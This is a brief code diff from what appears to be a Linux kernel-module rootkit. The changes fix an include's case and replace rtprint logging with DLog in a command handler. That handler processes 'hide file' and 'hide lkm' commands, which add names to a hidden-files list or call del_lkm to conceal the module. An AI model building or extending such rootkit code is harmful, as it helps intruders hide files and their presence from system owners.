@@ -1,5 +1,5 @@
 #include "RTcmd.h"
-#include "Rtlist.h"
+#include "RTlist.h"
 
 //创建四个双向循环链表，没有数据域
 LIST_HEAD(list_files);
@@ -16,9 +16,9 @@ lkm_mesg_proc(PCMD pCmd) {
         case CMD_HIDE_FILE:
         {
             if (pCmd->data) {
-                rtprint("hide file '%s'", pCmd->data);
+	            DLog("hide file '%s'", pCmd->data);
             } else {
-                rtprint("hide file error");
+	            DLog("hide file error");
             }
 
             insert_chars(&list_files, pCmd->data);
@@ -46,9 +46,9 @@ lkm_mesg_proc(PCMD pCmd) {
             //char data[260];
 
             if (pCmd->data) {
-                rtprint("hide lkm '%s'", pCmd->data);
+                DLog("hide lkm '%s'", pCmd->data);
             } else {
-                rtprint("hide lkm error");
+                DLog("hide lkm error");
             }
 
             del_lkm(pCmd->data);
